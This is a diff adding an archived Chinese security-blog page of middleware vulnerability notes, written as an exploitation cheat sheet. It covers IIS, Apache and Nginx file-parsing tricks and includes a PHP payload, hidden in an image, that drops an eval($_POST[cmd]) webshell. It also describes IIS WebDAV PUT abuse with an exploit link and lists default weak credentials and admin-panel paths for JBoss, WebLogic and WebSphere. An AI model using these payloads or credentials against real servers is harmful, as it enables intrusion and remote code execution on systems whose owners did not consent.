@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="baidu-site-verification" content="L6Lm9d5Crl"/>
+  
+  
+  
+  
+  <title>各种中间件漏洞笔记 | r1b00t’Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="r1b00t|漏洞|vuln|中间件漏洞">
+<meta name="keywords" content="漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="各种中间件漏洞笔记">
+<meta property="og:url" content="https://r1b00t.github.io/2017/08/29/各种中间件漏洞/index.html">
+<meta property="og:site_name" content="r1b00t’Blog">
+<meta property="og:description" content="r1b00t|漏洞|vuln|中间件漏洞">
+<meta property="og:updated_time" content="2017-08-30T06:32:00.700Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="各种中间件漏洞笔记">
+<meta name="twitter:description" content="r1b00t|漏洞|vuln|中间件漏洞">
+  
+    <link rel="alternative" href="/atom.xml" title="r1b00t’Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: false,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+        <a href="/" class="profilepic">
+            
+            <img src="/img/avatar.png" class="js-avatar" style="width: 100%;height: 100%;opacity: 1;">
+            
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">r1b00t</a></h1>
+        </hgroup>
+        
+        <p class="header-subtitle">r1b00t</p>
+        
+        
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a  href="/categories/ctf">CTF</a></li>
+                        
+                            <li><a  href="/categories/Web渗透">Web渗透</a></li>
+                        
+                            <li><a  href="/categories/nw">内网渗透</a></li>
+                        
+                            <li><a  href="/categories/vuln">漏洞</a></li>
+                        
+                            <li><a  href="/categories/kali">Kali</a></li>
+                        
+                            <li><a  href="/categories/linux">Linux</a></li>
+                        
+                            <li><a  href="/categories/python">Python</a></li>
+                        
+                            <li><a  href="/archives/">主页</a></li>
+                        
+                            <li><a  href="/about">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl github"  target="_blank" href="https://r1b00t.github.io/" title="github">github</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/Windows/" style="font-size: 15px;">Windows</a> <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/kali/" style="font-size: 10px;">kali</a> <a href="/tags/kali-Hydra/" style="font-size: 10px;">kali Hydra</a> <a href="/tags/lcx/" style="font-size: 10px;">lcx</a> <a href="/tags/linux/" style="font-size: 15px;">linux</a> <a href="/tags/metasploit/" style="font-size: 10px;">metasploit</a> <a href="/tags/msfvenom/" style="font-size: 10px;">msfvenom</a> <a href="/tags/nc/" style="font-size: 15px;">nc</a> <a href="/tags/portscan/" style="font-size: 10px;">portscan</a> <a href="/tags/python/" style="font-size: 15px;">python</a> <a href="/tags/reduh/" style="font-size: 10px;">reduh</a> <a href="/tags/zip/" style="font-size: 10px;">zip</a> <a href="/tags/内网/" style="font-size: 15px;">内网</a> <a href="/tags/反弹shell/" style="font-size: 10px;">反弹shell</a> <a href="/tags/多线程/" style="font-size: 10px;">多线程</a> <a href="/tags/提权/" style="font-size: 10px;">提权</a> <a href="/tags/渗透/" style="font-size: 15px;">渗透</a> <a href="/tags/漏洞/" style="font-size: 20px;">漏洞</a> <a href="/tags/爆破/" style="font-size: 10px;">爆破</a> <a href="/tags/端口扫描/" style="font-size: 10px;">端口扫描</a>
+                    </div>
+                </section>
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://r1b00t.github.io">github</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.shiyanbar.com">实验吧</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.ichunqiu.com">i春秋</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://www.freebuf.com">FreeBuf</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://www.leavesongs.com/">phith0n</a>
+                    
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">爱好枪击游戏，爱好渗透</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">r1b00t</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img src="/img/avatar.png" class="js-avatar" style="width: 100%; height: 100%; opacity: 1;">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">r1b00t</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">r1b00t</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/categories/ctf">CTF</a></li>
+                
+                    <li><a href="/categories/Web渗透">Web渗透</a></li>
+                
+                    <li><a href="/categories/nw">内网渗透</a></li>
+                
+                    <li><a href="/categories/vuln">漏洞</a></li>
+                
+                    <li><a href="/categories/kali">Kali</a></li>
+                
+                    <li><a href="/categories/linux">Linux</a></li>
+                
+                    <li><a href="/categories/python">Python</a></li>
+                
+                    <li><a href="/archives/">主页</a></li>
+                
+                    <li><a href="/about">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="github" target="_blank" href="https://r1b00t.github.io/" title="github">github</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-各种中间件漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2017/08/29/各种中间件漏洞/" class="article-date">
+      <time datetime="2017-08-29T07:19:30.729Z" itemprop="datePublished">2017-08-29</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      各种中间件漏洞笔记
+    </h1>
+  
+
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/vuln/">vuln</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞/">漏洞</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>IIS 6.0解析利用方法有两种：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">● 1.目录解析</div><div class="line">建立xx.asp为名称的文件夹，将asp文件放入，访问/xx.asp/xx.jpg，其中xx.jpg可以为任意文件后缀，即可解析</div><div class="line">  ● 2.文件解析</div><div class="line">后缀解析：/xx.asp;.jpg  /xx.asp:.jpg(此处需抓包修改文件名)</div><div class="line">  ● 3.默认解析：</div><div class="line">/xx.asa，/xx.cer，/xx.cdx</div></pre></td></tr></table></figure>
+<p>IIS7.5/ IIS 7.0/ Nginx <8.03畸形解析漏洞 iis="" 7.5的解析漏洞利用手法，在正常图片url后添加="" .php。="" 常用利用方法：="" 将一张图和一个写入后门代码的文本文件合并="" 将恶意文本写入图片的二进制代码之后，避免破坏图片文件头和尾="" <figure="" class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">内容 &lt;?PHP fputs(fopen(‘shell.php’,’w’),&apos;&lt;?phpeval($_POST[cmd])?&gt;’);?&gt;</div><div class="line">通过windows下copy命令合成，或者用hex工具直接写也可以</div><div class="line">然后访问xx.jpg/x.php,在这个目录下就会生成一句话木马shell.php</div></pre></td></tr></table></8.03畸形解析漏洞></p>
+<p>IIS PUT漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">  ● 2个错误配置造成</div><div class="line">      ○ 1.WEB服务器扩展里设置WebDAV为允许；</div><div class="line">      ○ 2.网站权限配置里开启了写入权限。</div><div class="line">      ○ 使用桂林老兵的工具</div><div class="line">l IIS溢出漏洞</div><div class="line">  ● 开启WebDAV服务的IIS 6.0被爆存在缓存区溢出漏洞导致远程代码执行，针对 Windows Server 2003 R2</div><div class="line">  ● POC: https://github.com/edwardz246003 ... b/master/exploit.py</div></pre></td></tr></table></figure></p>
+<p>Apache解析漏洞<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">● 后缀解析：test.php.x1.x2.x3</div><div class="line">    ○ Apache将从右至左开始判断后缀，若x3非可识别后缀，再判断x2，直到找到可识别后缀为止，然后将该可识别后缀进解析</div><div class="line">    ○ test.php.x1.x2.x3 则会被解析为php</div><div class="line">    ○ 经验之谈：php|php3|phtml|php4|php5 多可被Apache解析</div></pre></td></tr></table></figure></p>
+<p>Nginx解析漏洞<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">     ○ Nginx &lt;8.03畸形解析漏洞</div><div class="line">         ■ 直接在正常图片URL后添加 /.php</div><div class="line">○ Nginx &lt;=0.8.37</div><div class="line">         ■ 在Fast-CGI关闭的情况下，Nginx &lt;=0.8.37 依然存在解析漏洞</div><div class="line">         ■ 在一个文件路径(/xx.jpg)后面加上%00.php会将 /xx.jpg%00.php 解析为 php 文件。</div><div class="line">         ■ 这是从 /test.jpg/x.php 演变过来的，具体可以参考：Ngnix空字节可远程执行代码漏洞</div></pre></td></tr></table></figure></p>
+<p>JBOSS存在java反序列化命令执行<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">● 端口：8080（Web）、9990（Console）</div><div class="line">● 管理面板：http://&lt;host&gt;:9990</div><div class="line">● 弱口令</div><div class="line">○ jboss:jboss</div><div class="line">○ admin:admin</div></pre></td></tr></table></figure></p>
+<p>Weblogic存在java反序列化命令执行<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">● 端口 7001、7002（Web、Console）</div><div class="line">● 管理面板：http://&lt;host&gt;:7001/console/</div><div class="line">● 弱口令</div><div class="line">    ○ weblogic:weblogic</div><div class="line">    ○ system:system</div><div class="line">    ○ portaladmin:portaladmin</div><div class="line">    ○ guest:guest</div><div class="line">    ○ weblogic:admin123</div><div class="line">    ○ weblogic:weblogic123</div></pre></td></tr></table></figure></p>
+<p>WebSphere存在java反序列化命令执行<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">● 端口：9080、9443（Web）、9060、9043（Console）、…</div><div class="line">● 管理面板：</div><div class="line">○ http://&lt;host&gt;:7043/ibm/console/logon.jsp</div></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a  href="/2017/08/29/各种中间件漏洞/">各种中间件漏洞笔记</a></p>
+        <p><span>文章作者:</span><a  href="/" title="访问 r1b00t 的个人博客">r1b00t</a></p>
+        <p><span>发布时间:</span>2017年08月29日 - 15时19分</p>
+        <p><span>最后更新:</span>2017年08月30日 - 14时32分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2017/08/29/各种中间件漏洞/" title="各种中间件漏洞笔记">https://r1b00t.github.io/2017/08/29/各种中间件漏洞/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://r1b00t.github.io/2017/08/29/各种中间件漏洞/　　作者: r1b00t" title=""></span>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a  href="/2017/08/29/Redis未授权访问漏洞/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          Redis未授权访问漏洞getshell
+        
+      </div>
+    </a>
+  
+  
+    <a  href="/2017/08/29/web安全/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Web安全靶机实战</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a  href="/2017/08/29/Redis未授权访问漏洞/" title="上一篇: Redis未授权访问漏洞getshell">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a  href="/2017/08/29/web安全/" title="下一篇: Web安全靶机实战">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/python编写简单端口扫描/">python编写简单多线程指定端口扫描工具</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/python编写简单zip爆破工具/">python编写简单zip爆破工具</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/linux下各种反弹shell/">linux下各种反弹shell</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/rudh+lcx+nc内网渗透笔记/">reduh+lcx+nc内网渗透笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/Windows内网渗透常用命令/">Windows内网渗透提权命令</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/Hydra/">Hydra使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/ThinkPHP2.1命令执行漏洞/">ThinkPHP2.1命令执行漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/linux学习笔记/">Linux学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/msfvenom生成shell/">msfvenom生成shell</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/FCK编辑器漏洞/">Fck编辑器漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/Redis未授权访问漏洞/">Redis未授权访问漏洞getshell</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/各种中间件漏洞/">各种中间件漏洞笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/web安全/">Web安全靶机实战</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/ctf线下加固/">CTF线下加固</a></li></ul>
+    <script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        // $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#toc, .switch-btn, .switch-area").toggle();
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+                $(".switch-btn, .switch-area").fadeToggle(300);
+            }
+        })
+    </script>
+
+
+
+
+    <script>
+        
+    </script>
+
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2017 r1b00t
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo</a><a href="https://github.com/maochunguang" target="_blank">Blog</a> by tommy
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >极客到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 4;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'xxxxx', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+	<script>
+	var _hmt = _hmt || [];
+	(function() {
+	  var hm = document.createElement("script");
+	  hm.src = "//hm.baidu.com/hm.js?xxxxxx";
+	  var s = document.getElementsByTagName("script")[0]; 
+	  s.parentNode.insertBefore(hm, s);
+	})();
+	</script>
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+</body>
+</html>
